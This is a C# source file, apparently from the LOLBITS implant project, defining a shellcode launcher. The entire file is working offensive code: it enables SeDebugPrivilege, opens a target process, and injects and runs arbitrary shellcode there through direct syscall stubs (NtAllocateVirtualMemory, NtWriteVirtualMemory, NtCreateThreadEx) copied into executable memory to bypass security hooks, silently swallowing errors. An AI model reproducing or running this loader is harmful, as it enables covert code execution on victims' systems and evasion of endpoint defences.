using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace LOLBITS.Controlling
{
    public class LauncherShellCode
    {
        [Flags]
        public enum AllocationType : uint
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Reset = 0x80000,
            LargePages = 0x20000000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadwrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            Readonly = 0x02,
            Readwrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierFlag = 0x100,
            NocacheModifierFlag = 0x200,
            WriteCombineModifierFlag = 0x400
        }

        public enum FreeType : uint
        {
            MemDeCommit = 0x4000,
            MemRelease = 0x8000
        }

        public unsafe struct MyBuffer32
        {
            public fixed char FixedBuffer[32];
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct Unknown32
        {
            public readonly uint Size;
            public readonly uint Unknown1;
            public readonly uint Unknown2;
            public readonly MyBuffer32* Unknown3;
            public readonly uint Unknown4;
            public readonly uint Unknown5;
            public readonly uint Unknown6;
            public readonly MyBuffer32* Unknown7;
            public readonly uint Unknown8;
        }

        public unsafe struct MyBuffer64
        {
            public fixed char FixedBuffer[64];
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct Unknown64
        {
            public long Size;
            public long Unknown1;
            public long Unknown2;
            public MyBuffer64* UnknownPtr;
            public long Unknown3;
            public long Unknown4;
            public long Unknown5;
            public MyBuffer64* UnknownPtr2;
            public long Unknown6;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType lAllocationType, MemoryProtection flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtAllocateVirtualMemory(IntPtr processHandle, out IntPtr baseAddress, uint zeroBits, out UIntPtr regionSize, AllocationType allocationType, MemoryProtection protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal delegate int NtCreateThreadEx32(out IntPtr hThread, Int32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool createSuspended,
            uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, out Unknown32 lpBytesBuffer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] //NtCreateThreadEx expect different kind of parameters for 32 and 64 bits procesess. 
        private delegate int NtCreateThreadEx64(out IntPtr hThread, long desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool createSuspended,
            ulong stackZeroBits, ulong sizeOfStackCommit, ulong sizeOfStackReserve, out Unknown64 lpBytesBuffer);


        public static void Main(byte[] shellCode, SysCallManager sysCall, int pid)
        {
            var obj = new LauncherShellCode();

            var thr1 = new Thread(ExecuteShellCodeInMemory);

            var a = new object[] { shellCode, sysCall, pid};

            thr1.Start(a);
        }

        private static unsafe void ExecuteShellCodeInMemory(object args)        
        {
            var parameterArguments = (object[])args;
            var sc = (byte[]) parameterArguments[0];
            var sysCall = (SysCallManager)parameterArguments[1];
            var pid = (int)parameterArguments[2];
            var handle = Process.GetCurrentProcess().Handle;

            if(pid != -1)
            {
                var token = IntPtr.Zero;
                Utils.GetProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TokenAdjustPrivileges, out token, sysCall); 

                var l = new List<string>();
                l.Add("SeDebugPrivilege");
                Utils.EnablePrivileges(token, l);

                Utils.GetProcessHandle(pid, out handle, Utils.ProcessAccessFlags.CreateThread | Utils.ProcessAccessFlags.QueryInformation | 
                                                        Utils.ProcessAccessFlags.VirtualMemoryOperation | Utils.ProcessAccessFlags.VirtualMemoryWrite | Utils.ProcessAccessFlags.VirtualMemoryRead, sysCall);
            }

            try
            {
                var baseAddress = IntPtr.Zero;
                var shellCode = sysCall.GetSysCallAsm("NtAllocateVirtualMemory");
                var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
                    AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
                var sysCallDelegate =
                    Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtAllocateVirtualMemory));

                var arguments = new object[]
                {
                    handle, baseAddress, (uint) 0, (UIntPtr) (sc.Length + 1),
                    AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite
                };
                var returnValue = sysCallDelegate.DynamicInvoke(arguments);

                if ((int) returnValue != 0) return;

                baseAddress = (IntPtr) arguments[1]; //required!

                shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");
                shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
                    AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
                sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtWriteVirtualMemory));

                arguments = new object[] {handle, baseAddress, sc, (UIntPtr) (sc.Length + 1), IntPtr.Zero};

                returnValue = sysCallDelegate.DynamicInvoke(arguments);
                baseAddress = (IntPtr) arguments[1];

                if ((int) returnValue != 0) return;

                var a = new MyBuffer64();
                var b = new MyBuffer64();

                var u = new Unknown64();
                u.Size = (uint) Marshal.SizeOf(u);
                u.Unknown1 = 65539;
                u.Unknown2 = 16;
                u.UnknownPtr = &a;
                u.Unknown4 = 65540;
                u.Unknown5 = 8;
                u.Unknown6 = 0;
                u.UnknownPtr2 = &b;
                u.Unknown3 = 0;

                shellCode = sysCall.GetSysCallAsm("NtCreateThreadEx");
                shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
                    AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
                sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtCreateThreadEx64));

                arguments = new object[]
                {
                    IntPtr.Zero, 0x001FFFFF, IntPtr.Zero, handle, baseAddress, IntPtr.Zero, false, (ulong) 0, (ulong) 0,
                    (ulong) 0, u
                };
                returnValue = sysCallDelegate.DynamicInvoke(arguments);
            }
            catch
            {

            }
        }
    }
}